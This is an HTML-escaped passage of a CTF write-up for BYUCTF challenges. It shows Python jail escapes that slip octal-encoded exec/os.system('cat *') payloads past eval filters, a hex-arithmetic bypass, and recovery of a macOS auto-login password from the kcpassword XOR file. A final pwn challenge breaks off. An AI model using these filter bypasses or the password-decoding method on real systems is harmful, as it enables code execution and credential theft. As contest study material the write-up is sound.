&lt;&#x2F;span&gt;&lt;span&gt;inp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;[123456789]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;inp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;inp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(inp) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1337&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Nope&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(FLAG)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, the input was sanitized before evaluating by eval().&lt;&#x2F;p&gt;
&lt;p&gt;To print the FLAG,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;input shouldn&#x27;t contain a digit except 0&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;input shouldn&#x27;t have a &#x27;(&#x27;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;but the eval output should be a number (1337)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;I tried this payload which is a calculation of hexadigits which is equals to 1337&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;0xff+0xff+0xff+0xff+0xff+0x0a + 0x0a + 0x0a + 0x0a + 0x0a + 0x0a + 0xae-0xac
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40001
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xff+0xff+0xff+0xff+0xff+0x0a&lt;&#x2F;span&gt;&lt;span&gt; + 0x0a + 0x0a + 0x0a + 0x0a + 0x0a + 0xae-0xac
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{aaaaaaand_more_simple_bypasses_:&lt;&#x2F;span&gt;&lt;span&gt;)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{aaaaaaand_more_simple_bypasses_:)}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;abcdefghijklm&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#abcdefghijklm&quot; aria-label=&quot;Anchor link for: abcdefghijklm&quot;&gt;abcdefghijklm&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;You can&amp;#39;t use any of the first 13 letters of the alphabet EXCEPT for the first 4 letters of your input
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;OH and don&amp;#39;t make it too long
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc byuctf.xyz 40003
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [abcdefghijklm.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;abcdefghijklm.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;inp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lower&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;((inp[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;re&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;[a-m]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;inp[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like a simple code, but it was too painful for me on finding a payload for it.&lt;&#x2F;p&gt;
&lt;p&gt;Tried these many payloads&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;# open(&amp;quot;flag.txt&amp;quot;).read()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# &amp;#39;open(&amp;quot;\146\154\141\147.txt&amp;quot;).r\145\141\144()&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# open(&amp;quot;\146\154\141\147\56\164\170\164&amp;quot;).read()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# &amp;quot;\157\160\145\156\50\42\52\56\164\170\164\42\51\56\162\145\141\144\50\51&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# &amp;#39;exec(&amp;quot;\157\160\145\156\50\42\52\56\164\170\164\42\51\56\162\145\141\144\50\51&amp;quot;)&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# &amp;#39;exec(&amp;quot;op\145n(\42\146\154\141\147.txt\42)\56\162\145\141\144\50\51&amp;quot;)&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# exec(&amp;quot;__\151\155port__(\47os\47)\56syst\145\155(\47cat *.txt\47)&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Finally, &lt;code&gt;exec(&#x27;__\151\155port__(&quot;os&quot;).syst\145\155(&quot;\143\141t *&quot;)&#x27;)&lt;&#x2F;code&gt; was done the job. The numbers used here are the octals, on the eval function these will be converted back to the equivalent characters.  The original one was
&lt;code&gt;exec(&#x27;__import__(&quot;os&quot;).system(&quot;cat *&quot;)&#x27;)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40003
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;code &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; exec(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__\151\155port__(&amp;quot;os&amp;quot;).syst\145\155(&amp;quot;\143\141t *&amp;quot;)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inp&lt;&#x2F;span&gt;&lt;span&gt; = input(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.lower&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;eval((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inp[:4]+__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;re&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;).sub(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;[a-m]&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,inp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;4:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[:80]&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{enc0dings_4r3_us3d_f0r_jailz&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;#!&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;bin&#x2F;sh
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;ctf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;python3&lt;&#x2F;span&gt;&lt;span&gt; abcdefghijklm.py^C
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{enc0dings_4r3_us3d_f0r_jailz}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;nopqrstuvw&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#nopqrstuvw&quot; aria-label=&quot;Anchor link for: nopqrstuvw&quot;&gt;nopqrstuvw&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;You can&amp;#39;t use any of the last 13 letters of the alphabet EXCEPT for the first 4 letters
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;OH and don&amp;#39;t make it too long
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc byuctf.xyz 40004
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [nopqrstuvwxyz.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nopqrstuvw.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;inp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lower&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;((inp[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;re&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sub&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;[n-z]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;inp[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It was simple now, as I solved the above chall. Same payload can be used here with the change of alphabets.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;exec(&#x27;__im\160\157\162\164__(&quot;\157\163&quot;).\163\171\163\164em(&quot;ca\164 *&quot;)&#x27;)&lt;&#x2F;code&gt;  An inverted version of previous payload.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40004
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;code &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; exec(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__im\160\157\162\164__(&amp;quot;\157\163&amp;quot;).\163\171\163\164em(&amp;quot;ca\164 *&amp;quot;)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{1_l0v3_c0nnected_ch4llz&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inp&lt;&#x2F;span&gt;&lt;span&gt; = input(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.lower&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;eval((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inp[:4]+__import__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;re&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;).sub(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;[n-z]&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,inp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;4:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[:80]&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;#!&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;bin&#x2F;sh
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;ctf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;python3&lt;&#x2F;span&gt;&lt;span&gt; nopqrstuvwxyz.py^C
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{1_l0v3_c0nnected_ch4llz}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics&quot; aria-label=&quot;Anchor link for: forensics&quot;&gt;forensics&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;kcpassword&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#kcpassword&quot; aria-label=&quot;Anchor link for: kcpassword&quot;&gt;kcpassword&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;I&amp;#39;m too lazy to log into my Mac each time, so I enabled auto-logon. It&amp;#39;s okay though because I&amp;#39;m sure that Apple will protect my password sufficiently...
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [kcpassword]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The macOS just saves the user password in the kcpassword file after XORing the password with a static key. So, againa XORing the kcpassword file will result the password.&lt;&#x2F;p&gt;
&lt;p&gt;Found this &lt;a href=&quot;https:&#x2F;&#x2F;tinyapps.org&#x2F;blog&#x2F;201709070700_kcpassword.html&quot; target=_blank&gt; this blog &lt;&#x2F;a&gt; useful for this chall.&lt;&#x2F;p&gt;
&lt;p&gt;Got a kpass.py file to decrypt the kcpassword file.&lt;&#x2F;p&gt;
&lt;p&gt;The kpass.py program expects a command line arguemnet which is the hex data of kpassword file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; python2 kcpass.py $(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xxd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -p&lt;&#x2F;span&gt;&lt;span&gt; kcpassword)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{wow_Macs_really_have_it_encrypted_with_a_static_key_lol&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{wow_Macs_really_have_it_encrypted_with_a_static_key_lol}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;pwn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pwn&quot; aria-label=&quot;Anchor link for: pwn&quot;&gt;pwn&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;2038&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2038&quot; aria-label=&quot;Anchor link for: 2038&quot;&gt;2038&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;I know you really want the flag, so I&amp;#39;ll print it out for you, but only after January 1st, 2024 :)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;`nc byuctf.xyz 40007`
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [2038]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;Tools&#x2F;kcpassword$&lt;&#x2F;span&gt;&lt;span&gt; nc byuctf.xyz 40007
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Task: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print_flag&amp;#39;
